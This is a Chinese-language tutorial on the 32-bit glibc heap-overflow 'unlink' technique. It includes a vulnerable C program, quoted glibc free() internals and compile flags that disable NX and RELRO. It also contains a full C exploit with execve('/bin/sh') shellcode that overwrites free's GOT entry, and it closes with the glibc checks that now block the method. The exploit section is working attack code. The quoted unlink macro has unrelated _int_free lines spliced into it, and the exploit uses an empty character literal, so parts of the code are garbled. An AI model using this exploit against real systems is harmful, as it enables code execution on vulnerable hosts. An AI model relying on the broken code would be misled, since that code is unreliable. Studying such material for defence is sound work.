# 0x00 beginning

这个 post 主要记录学习 32 位 linux 下堆溢出使用的 unlink 技术, 依赖到`ptmalloc2`那部分的知识, 实验主要取自 [^orgin], 更多理论来自 [^phrack] 与 [^internal].

## prepare

存在堆溢出的代码

```c
#include <stdlib.h>
#include <string.h>

int main( int argc, char * argv[] )
{
        char * first, * second;

/*[1]*/ first = malloc( 666 );
/*[2]*/ second = malloc( 12 );
        if(argc!=1)
/*[3]*/         strcpy( first, argv[1] );
/*[4]*/ free( first );
/*[5]*/ free( second );
/*[6]*/ return( 0 );
}
```

代码很容易读懂, 就是从命令行读取第二个参数 (argv[1]) 不加校验复制到缓冲区 first, 如果 argv[1] 所指的字符串大于 666 字节就会在堆空间发生溢出, 具体会覆盖掉下一个`chunk header`, 这可能会导任意代码执行.
图示内存布局:
![unlink](../media/pic/heap/overflow_unlink.png)

# 0x10 depending

这个技术主要思路是戏弄`glibc malloc`的内存回收机制, 讲上面内存布局中的`second chunk`给`unlink`掉, 并且在`unlink`第二个`chunk`期间将会覆写 free 函数的 got 表项为 shellcode 的地址! 在成功覆写过后, 在 [5] 调用`free`时`shellcode`将会被执行, 看上面操作可以发现其核心就是在`unlink`操作上.

```c
#define unlink(AV, P, BK, FD) {                                            \
    FD = P->fd;								      \
    BK = P->bk;								      \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))		      \
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
    else {								      \
              if (!in_smallbin_range(size))
	{
	  p->fd_nextsize = NULL;
	  p->bk_nextsize = NULL;
	}
      bck->fd = p;
      fwd->bk = p;

      set_head(p, size | PREV_INUSE);
      set_foot(p, size);

      check_free_chunk(av, p);
    }
FD->bk = BK;							      \
        BK->fd = FD;							      \
        if (!in_smallbin_range (P->size)				      \
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {		      \
	    if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)	      \
		|| __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
	      malloc_printerr (check_action,				      \
			       "corrupted double-linked list (not small)",    \
			       P, AV);					      \
            if (FD->fd_nextsize == NULL) {				      \
                if (P->fd_nextsize == P)				      \
                  FD->fd_nextsize = FD->bk_nextsize = FD;		      \
                else {							      \
                    FD->fd_nextsize = P->fd_nextsize;			      \
                    FD->bk_nextsize = P->bk_nextsize;			      \
                    P->fd_nextsize->bk_nextsize = FD;			      \
                    P->bk_nextsize->fd_nextsize = FD;			      \
                  }							      \
              } else {							      \
                P->fd_nextsize->bk_nextsize = P->bk_nextsize;		      \
                P->bk_nextsize->fd_nextsize = P->fd_nextsize;		      \
              }								      \
          }								      \
      }									      \
}
```

如果没有攻击的影响 free 函数进行如下操作

## 1) 检查 non mmapped chunk

检查`non mmapped chunk`后进行向前或者向后合并。

```c
static void
_int_free (mstate av, mchunkptr p, int have_lock)
{
...
  /*
    Consolidate other non-mmapped chunks as they arrive.
  */

  else if (!chunk_is_mmapped(p)) {
    if (! have_lock) {
      (void)mutex_lock(&av->mutex);
      locked = 1;
    }

    nextchunk = chunk_at_offset(p, size);

    /* Lightweight tests: check whether the block is already the
       top block.  */
    if (__glibc_unlikely (p == av->top))
      {
	errstr = "double free or corruption (top)";
	goto errout;
      }
    /* Or whether the next chunk is beyond the boundaries of the arena.  */
    if (__builtin_expect (contiguous (av)
			  && (char *) nextchunk
			  >= ((char *) av->top + chunksize(av->top)), 0))
      {
	errstr = "double free or corruption (out)";
	goto errout;
      }
    /* Or whether the block is actually not marked used.  */
    if (__glibc_unlikely (!prev_inuse(nextchunk)))
      {
	errstr = "double free or corruption (!prev)";
	goto errout;
      }

    nextsize = chunksize(nextchunk);
...    
```

## 2) 向后合并

### 查看 previous chunk 是否处于 free 状态

```c
static void
_int_free (mstate av, mchunkptr p, int have_lock)
{
...
    /* consolidate backward */
    if (!prev_inuse(p)) { // here is
      prevsize = p->prev_size;
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      unlink(av, p, bck, fwd);
    }
```

如果当前被释放的 chunk 的 P (PREV_INUSE) 位没有被设置,则说明前 chunk 是处于 free。在我们的例子中，previous chunk 自`first`的 P 位由是被分配出去的,因为 default chunk 前面是堆的最靠前位置被约定为分配的(即使它不存在)。

### 如果处于 free 状态则合并

```c
static void
_int_free (mstate av, mchunkptr p, int have_lock)
{...
      prevsize = p->prev_size;
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      unlink(av, p, bck, fwd); // here is
```

也就是说，把`previous chunk`自它的`binlist`移除，把`previous chunk`的大小增加到当前的`chunk`并修改`chunk`的指针指向`previous chunk`。因为在我们的例子中`previous chunk`是被分配出去的，所以`unlink`没有被触发，这样的话当前的被释放的`first`不会被向后合并。

## 3) 向前合并

### 查看 next chunk 是否处于 free 状态

```c
static void
_int_free (mstate av, mchunkptr p, int have_lock)
{
...
    /* consolidate backward */
    if (!prev_inuse(p)) { // here is
      prevsize = p->prev_size;
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      unlink(av, p, bck, fwd);
    }

    if (nextchunk != av->top) {
      /* get and clear inuse bit */
      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);
      ...
```

如果下下个`chunk`的 P 未被置位,则`next chunk`是`free`状态。靠导航到下下个`chunk`，增加当前被释放的`chunk`的空间到它的`chunk`指针，然后增加下一个`chunk`的 size 到下个`chunk`指针。在我们的例子中下下个`chunks`是被回收的，first's chunk 是一个`top chunk`而且它的`PREV_INUSE`是被置位的,这表明后面的`chunk`是即 second `chunk`不是 free 状态。

### 如果处于 free 状态则合并

```c
static void
_int_free (mstate av, mchunkptr p, int have_lock)
{
...
    if (nextchunk != av->top) {
      /* get and clear inuse bit */
      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

      /* consolidate forward */
      if (!nextinuse) {
	unlink(av, nextchunk, bck, fwd); // here is
	size += nextsize;
      } else
	clear_inuse_bit_at_offset(nextchunk, 0);
    ...
```

`next chunk`来自它的`binlist` 把`next chunk`的空间增加到当前`chunk`中。在我们的例子中，`next chunk`是被分配出去的，因此`unlink`是不会被调用的，这个情况下当前被回收的 first `chunk`是不会像前合并的。

## 4) 合并`chunk`到`unsorted bin`

```c
static void
_int_free (mstate av, mchunkptr p, int have_lock)
{
  INTERNAL_SIZE_T size;        /* its size */
  mfastbinptr *fb;             /* associated fastbin */
  mchunkptr nextchunk;         /* next contiguous chunk */
  INTERNAL_SIZE_T nextsize;    /* its size */
  int nextinuse;               /* true if nextchunk is used */
  INTERNAL_SIZE_T prevsize;    /* size of previous contiguous chunk */
  mchunkptr bck;               /* misc temp for linking */
  mchunkptr fwd;               /* misc temp for linking */
  ...
      /*
	Place the chunk in unsorted chunk list. Chunks are
	not placed into regular bins until after they have
	been given one chance to be used in malloc.
      */

      bck = unsorted_chunks(av);
      fwd = bck->fd;
      if (__glibc_unlikely (fwd->bk != bck))
	{
	  errstr = "free(): corrupted unsorted chunks";
	  goto errout;
	}
      p->fd = fwd;
      p->bk = bck;
      if (!in_smallbin_range(size))
	{
	  p->fd_nextsize = NULL;
	  p->bk_nextsize = NULL;
	}
      bck->fd = p;
      fwd->bk = p;

      set_head(p, size | PREV_INUSE);
      set_foot(p, size);

      check_free_chunk(av, p);
    }
...
```

在上面的例子中不会有这样的合并发生。

# 0x20 practice

现在在来看`strcpy( first, argv[1] )`覆写`chunk`头部的构造：

>
prev_size = 是个数字，因此 PREV_INUSE 不会被置位。
size = -4
fd = free address - 12
bk = shellcode address

如果攻击顺利那么 line［4］将会进行下面的操作:

>
* 对`non mmapped chunks`而言可能有两种合并。
* 向后合并:
1. 查看前面`previous chunk`的 free 状态:
2. 如果是 free 考虑合并:
* 向前合并:
1. 向后查看`next chunk`的 free 状态:
2. 如果是 free 考虑合并:

图解示例漏洞程序在构造出来出的数据输入下的内存布局:

![unlink](../media/pic/heap/unlink.png)

## 0x21 compilation

```shell
$ gcc -g -z norelro -z execstack -o vuln vuln.c -Wl,--rpath=/home/sploitfun/glibc/glibc-inst2.20/lib -Wl,--dynamic-linker=/home/sploitfun/glibc/glibc-inst2.20/lib/ld-linux.so.2
```

安装上面 shell 提供的命令行提供的参数，可以避免使用默认的安全机制有：NX,RELRO,当然 ASLR 需要手工在操作系统里面暂时关闭。

## 0x21 exploit

理解了上面 unlink 的技术的本质,开始动手写 exploit。

```c
/* Program to exploit 'vuln' using unlink technique.
 */
#include <string.h>
#include <unistd.h>

#define FUNCTION_POINTER ( 0x0804978c )         //Address of GOT entry for free function obtained using "objdump -R vuln".
#define CODE_ADDRESS ( 0x0804a008 + 0x10 )      //Address of variable 'first' in vuln executable. 

#define VULNERABLE "./vuln"
#define DUMMY 0xdefaced
#define PREV_INUSE 0x1

char shellcode[] =
        /* Jump instruction to jump past 10 bytes. ppssssffff - Of which ffff would be overwritten by unlink function
        (by statement BK->fd = FD). Hence if no jump exists shell code would get corrupted by unlink function. 
        Therefore store the actual shellcode 12 bytes past the beginning of buffer 'first'*/
        "\xeb\x0assppppffff"
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

int main( void )
{
        char * p;
        char argv1[ 680 + 1 ];
        char * argv[] = { VULNERABLE, argv1, NULL };

        p = argv1;
        /* the fd field of the first chunk */
        *( (void **)p ) = (void *)( DUMMY );
        p += 4;
        /* the bk field of the first chunk */
        *( (void **)p ) = (void *)( DUMMY );
        p += 4;
        /* the fd_nextsize field of the first chunk */
        *( (void **)p ) = (void *)( DUMMY );
        p += 4;
        /* the bk_nextsize field of the first chunk */
        *( (void **)p ) = (void *)( DUMMY );
        p += 4;
        /* Copy the shellcode */
        memcpy( p, shellcode, strlen(shellcode) );
        p += strlen( shellcode );
        /* Padding- 16 bytes for prev_size,size,fd and bk of second chunk. 16 bytes for fd,bk,fd_nextsize,bk_nextsize 
        of first chunk */
        memset( p, 'B', (680 - 4*4) - (4*4 + strlen(shellcode)) );
        p += ( 680 - 4*4 ) - ( 4*4 + strlen(shellcode) );
        /* the prev_size field of the second chunk. Just make sure its an even number ie) its prev_inuse bit is unset */
        *( (size_t *)p ) = (size_t)( DUMMY & ~PREV_INUSE );
        p += 4;
        /* the size field of the second chunk. By setting size to -4, we trick glibc malloc to unlink second chunk.*/
        *( (size_t *)p ) = (size_t)( -4 );
        p += 4;
        /* the fd field of the second chunk. It should point to free - 12. -12 is required since unlink function
        would do + 12 (FD->bk). This helps to overwrite the GOT entry of free with the address we have overwritten in 
        second chunk's bk field (see below) */
        *( (void **)p ) = (void *)( FUNCTION_POINTER - 12 );
        p += 4;
        /* the bk field of the second chunk. It should point to shell code address.*/
        *( (void **)p ) = (void *)( CODE_ADDRESS );
        p += 4;
        /* the terminating NUL character */
        *p = '';

        /* the execution of the vulnerable program */
        execve( argv[0], argv, NULL );
        return( -1 );
}

```

执行上面的程序，可以看到一个新的 shell spawned!

```shell

$ gcc -g -o exp exp.c
./exp 
$ ls
cmd  exp  exp.c  vuln  vuln.c
```

# 0x30 protection

如今`unlink`技术自从`glibc`提供了`GOT`加固时就已经过时了！而且在`glibc`中也增加了对于`unlink`利用的的检查。

## 0x31 double free

```c
    if (__glibc_unlikely (!prev_inuse(nextchunk)))
      {
        errstr = "double free or corruption (!prev)";
        goto errout;
      }
```

## 0x32 invalid next size

```c
 if (__builtin_expect (nextchunk->size <= 2 * SIZE_SZ, 0)
        || __builtin_expect (nextsize >= av->system_mem, 0))
      {
        errstr = "free(): invalid next size (normal)";
        goto errout;
      }
```

## 0x33 Courrupted Double Linked list

```
 if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                     
      malloc_printerr (check_action, "corrupted double-linked list", P);
```

### reference

[^orgin]: [Heap overflow using unlink](https://sploitfun.wordpress.com/2015/02/26/heap-overflow-using-unlink/)
[^phrack]: [Volume 0x0b, Issue 0x39, Phile #0x08 of 0x12](http://phrack.org/issues/57/8.html#article)
[^internal]: [linux heap internals](../media/attach/Linux Heap Internals.pdf)
